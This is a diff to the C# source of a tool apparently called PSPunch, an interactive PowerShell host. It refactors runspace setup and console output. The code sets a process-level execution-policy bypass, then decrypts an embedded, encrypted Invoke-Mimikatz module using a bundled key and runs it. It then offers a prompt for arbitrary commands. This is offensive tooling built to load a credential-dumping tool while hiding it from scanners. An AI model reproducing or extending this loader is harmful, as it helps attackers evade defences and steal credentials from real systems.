@@ -11,22 +11,27 @@ namespace PSPunch
 {
     class Program
     {
-        static Runspace PSInit(PSPunchHost host)
+        static PunchInput PSInit()
         {
-            Runspace runspace = RunspaceFactory.CreateRunspace(host);
+            PunchInput punchInput = new PunchInput();
+            punchInput.host = new PSPunchHost();
+            Runspace runspace = RunspaceFactory.CreateRunspace(punchInput.host);
             runspace.Open();
-            Processing.PSExec(runspace, host, "set-executionpolicy bypass -Scope process -Force");
-            return runspace;
+            punchInput.runspace = runspace;
+            punchInput.cmd = "set-executionpolicy bypass -Scope process -Force";
+            Processing.PSExec(punchInput);
+            return punchInput;
 
         }
-        static void ImportModules(Runspace runspace, PSPunchHost host, Stream moduleStream)
+        static void DisplayOutput(PunchInput punchInput) { }
+        static void ImportModules(PunchInput punchInput, Stream moduleStream)
         {
             Assembly assembly = Assembly.GetExecutingAssembly();
             StreamReader keyReader = new StreamReader(assembly.GetManifestResourceStream("PSPunch.Modules.key.txt"));
             string key = keyReader.ReadToEnd();
             MemoryStream decMem = FileTools.DecryptFile(moduleStream, key);
-            string module = Encoding.Unicode.GetString(decMem.ToArray());
-            Processing.PSExec(runspace, host, module);
+            punchInput.cmd = Encoding.Unicode.GetString(decMem.ToArray());
+            Processing.PSExec(punchInput);
         }
 
         static void Main(string[] args)
@@ -34,15 +39,13 @@ namespace PSPunch
             string prompt = "PSPUNCH! #> ";
             Console.BackgroundColor = ConsoleColor.DarkBlue;
             Console.Clear();
-            PSPunchHost host = new PSPunchHost();
-            Runspace runspace = PSInit(host);
+            PunchInput punchInput = PSInit();
             Assembly assembly = Assembly.GetExecutingAssembly();
             Stream moduleStream = assembly.GetManifestResourceStream("PSPunch.Modules.invoke-mimikatz.ps1.enc");
-            ImportModules(runspace, host, moduleStream);
+            ImportModules(punchInput, moduleStream);
 
             while (true)
             {
-                PunchInput punchInput = new PunchInput();
                 int consoleTopPos = Console.CursorTop;
                 punchInput.loopPos = 0;
                 punchInput.inLoop = false;
@@ -53,6 +56,14 @@ namespace PSPunch
                 while (punchInput.keyInfo.Key != ConsoleKey.Enter)
                 {
                     punchInput = Processing.CommandProcessor(punchInput);
+                    if (punchInput.output != null)
+                    {
+                        Console.WriteLine("\n" + punchInput.output);
+                        consoleTopPos = Console.CursorTop;
+                        Console.ForegroundColor = ConsoleColor.White;
+                        Console.Write(prompt);
+                        Console.ForegroundColor = ConsoleColor.Yellow;
+                    }
                     Console.SetCursorPosition(prompt.Length, consoleTopPos);
                     Console.Write(new string(' ', Console.WindowWidth));
                     Console.SetCursorPosition(prompt.Length, consoleTopPos);
@@ -63,8 +74,16 @@ namespace PSPunch
                 {
                     return;
                 }
-                string output = Processing.PSExec(runspace, host, punchInput.cmd);
-                Console.Write(output);
+                if (punchInput.cmd == "clear")
+                {
+                    Console.Clear();
+                    punchInput.cmd = null;
+                }
+                if (punchInput.cmd != null)
+                {
+                    punchInput = Processing.PSExec(punchInput);
+                    Console.WriteLine("\n" + punchInput.output);
+                }
             }
         }
     }
